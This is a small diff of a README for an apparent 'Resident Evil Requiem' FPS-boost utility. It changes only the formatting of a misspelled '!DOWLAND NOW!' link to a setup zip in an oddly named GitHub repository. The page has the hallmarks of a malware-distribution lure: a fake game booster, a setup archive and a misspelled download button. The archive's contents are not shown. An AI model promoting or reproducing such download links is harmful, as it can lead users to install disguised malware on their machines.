@@ -27,7 +27,7 @@ Follow these steps to begin using the **Resident Evil Requiem Performance Optimi
 |--------|---------|
 | Get the tool | Click the button below to start the download |
 
-👉 **[!DOWLAND NOW!](https://github.com/robertk-io2001c3/-Resident-Evil-9-FPS-Boost-Utility-2026/blob/main/booster%20setup%20v1.2.4.zip)
+👉 [!DOWLAND NOW!](https://github.com/robertk-io2001c3/-Resident-Evil-9-FPS-Boost-Utility-2026/blob/main/booster%20setup%20v1.2.4.zip)
 
 ---
 
